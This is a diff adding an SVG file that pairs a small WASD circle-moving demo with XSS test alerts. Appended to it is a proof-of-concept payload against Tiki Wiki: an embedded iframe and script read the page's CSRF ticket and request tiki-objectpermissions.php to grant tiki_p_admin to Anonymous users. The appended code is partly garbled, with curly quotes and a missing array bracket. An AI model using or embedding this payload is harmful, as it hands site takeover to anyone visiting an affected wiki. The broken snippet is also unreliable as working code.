@@ -1,0 +1,34 @@
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
+  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
+  <circle cx="250" cy="250" r="50" fill="red" />
+  <script type="text/javascript"><![CDATA[
+    alert("2");
+    var KEY = { w:87, a:65, s:83, d:68 };
+    var moveSpeed = 5;
+    var circle = document.getElementsByTagName("circle")[0];
+    var x = circle.getAttribute('cx')*1,
+        y = circle.getAttribute('cy')*1;
+    document.documentElement.addEventListener('keydown',function(evt){
+      switch (evt.keyCode){
+        case KEY.w:
+          circle.setAttribute('cy',y-=moveSpeed);
+          // Alternatively:
+          // circle.cy.baseVal.value = (y-=moveSpeed);
+        break;
+        case KEY.s:
+          circle.setAttribute('cy',y+=moveSpeed);
+        break;
+        case KEY.a:
+          circle.setAttribute('cx',x-=moveSpeed);
+        break;
+        case KEY.d:
+          circle.setAttribute('cx',x+=moveSpeed);
+        break;
+      }
+    },false);
+  ]]></script>
+
+<foreignObject> <iframe id=”frame1” src=”./tiki-view_forum_thread.php?forumId=1&threadId=1&comzone=show#threadId1”></iframe> </foreignObject> <script type=”text/javascript”> setTimeout(poc, 3000); function poc() { var iframe = document.getElementById(“frame1”); var fr = (iframe.contentDocument) ? iframe.contentDocument : iframe.contentWindow.document; var ticket=fr.getElementsByName(‘ticket’)0.value; document.getElementById(‘frame1’).src = “./tiki-objectpermissions.php?objectType=global&amp;permType=global&amp;perm%5BAnonymous%5D%5B%5D=tiki_p_admin&amp;assign=Assign&amp;ticket=”+ticket+”&amp;daconfirm=y”; } </script>
+
+</svg>
